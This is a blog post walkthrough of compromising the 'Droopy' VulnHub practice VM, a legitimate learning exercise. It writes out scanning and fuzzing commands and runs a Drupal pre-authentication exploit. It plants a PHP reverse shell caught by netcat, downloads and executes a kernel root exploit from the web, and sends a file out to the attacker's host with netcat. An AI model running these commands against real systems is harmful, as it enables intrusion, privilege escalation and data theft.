---
layout: post
title:  "vulnhub droopy vm"
date:   2016-05-26 00:00:10 +0000
categories: vulnhub
---
<p>Been a while since i played with vulnhub. So since yesterday i've been trying to break <a href="https://www.vulnhub.com/entry/droopy-v02,143/">droopy</a>, which i almost did ...
<p>So, the usual stuff:
{% highlight bash %}
sudo netdiscover -r 192.168.0.0/16
{% endhighlight %}
<p> My target is 192.168.1.89 .
{% highlight bash %}
nmap -p- -sV 192.168.1.89
{% endhighlight %}
<p> Found a port 80 open. I followed it since it was the only one open and found a drupal website.
<br>I tried to create a user no luck, i searched for something interesting in the sub-directories:
{% highlight bash %}
python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404   http://192.168.1.89/FUZZ
{% endhighlight %}
<pre>
==================================================================
ID	Response   Lines      Word         Chars          Request
==================================================================

00385:  C=301      9 L	      28 W	    314 Ch	  "includes"
00491:  C=301      9 L	      28 W	    310 Ch	  "misc"
00499:  C=301      9 L	      28 W	    313 Ch	  "modules"
00675:  C=301      9 L	      28 W	    313 Ch	  "scripts"
00724:  C=301      9 L	      28 W	    311 Ch	  "sites"
</pre>
<p>... after a while decide to change and look for the drupal stuff. I found this gem <a href="https://github.com/droope/droopescan">droopescan</a> and found drupal 7.3 was in usage.
{% highlight bash %}
./droopescan  scan drupal -u http://192.168.1.88/ -t 8
{% endhighlight %}
<p>I don't usually ( at least i don't remember) hunt for exploits but his time this seemed a reasonable choice since it was an old version of drupal and i had no other ideia.
<p>Found the exploit ... a pre-authentication one, wow. o.o !!
<a href="https://www.exploit-db.com/exploits/34992/">the exploit</a>
{% highlight bash %}
python 34992.py  -t http://192.168.1.88 -u impious -p impious
{% endhighlight %}
<p>User created.

<p> So, in the admin panel after a while trying to add a "file uploader" to the article i saw an item saying to enable PHP to run. I wonder if this is commom usage in other CMS and similar, like wordpress and stuff... must check this.
<br>In modules I set the PHP to ok and then set the possibility to add php code in 'articles'. Next, i created a new article and used this <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php reverse shell</a> pointing to my computer. With the usual suspect netcat for the win:
{% highlight bash %}
nc -lnvvp 12344
{% endhighlight %}
I created an article with that PHP in the body!
<p><b>shell!</b>

<p>After fooling around in the server, moving around all directories i could remember,there was no commom user directories to see .bash_history and not much besides the mysql password with no further info in the database as well.
I knew it was an old kernel, it's probably the first command i do whenever i connect to a server:
{% highlight bash %}
uname -a
{% endhighlight %}
Old old kernel... then again, i had no clue what to do next so i choose the easy path:
{% highlight bash %}
cd /tmp
wget https://www.kernel-exploits.com/media/ofs_64
chmod +x ofs_64
./ofs_64
{% endhighlight %}
<p><b>ROOT!</b> Oh!
<p>Reading the email in /var/spool/mail/www-data and the help hints i knew i had to use rockyou passwordlist against somehting and found the encrypted file in:
{% highlight bash %}
/root/dave.tc
{% endhighlight %}
<p>So copied the file with netcat to my computer:
{% highlight bash %}
nc -lnvvp 12345 > dave.tc
nc 192.168.1.73 12345 < dave.tc
{% endhighlight %}
<p>Well, then i gave up... i started cracking it with hashcat and went to do something else ... when i got back after 2 hours... no luck... wtf... i must have done something wrong.
<p>I thought i did something wrong.. 2 exploits in one VM and still no flag?  Hm... so i went to check other people resolutions: it appears they filtered the rockyou by the word 'academy' ( from the email in /var/spool/mail/www-data)... <b>i would never do that, honestly.</b> I still fail to see that hint in the email :P . So then they mount the truecrypt and found the flag in an hidden folder.
<p>Fun until root! :) After that i started wondering if what i was doing was ok, mainly those 2 exploits usage.
